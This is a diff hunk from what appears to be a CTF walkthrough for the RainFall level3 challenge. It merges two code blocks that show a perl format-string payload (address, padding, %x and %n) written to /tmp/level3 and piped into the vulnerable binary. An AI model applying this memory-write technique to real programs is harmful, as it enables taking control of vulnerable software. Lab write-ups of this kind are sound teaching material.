@@ -68,9 +68,6 @@ We can now use the `%n` conversion which prints the number of characters written
 
 ```console
 level3@RainFall:~$ perl -e 'print "\x8c\x98\x04\x0812345678901234567890123456789012345678901%x%x%x%n"' > /tmp/level3
-```
-
-```console
 level3@RainFall:~$ cat /tmp/level3 - | ./level3
 ...
 [hit return, some garbage display]
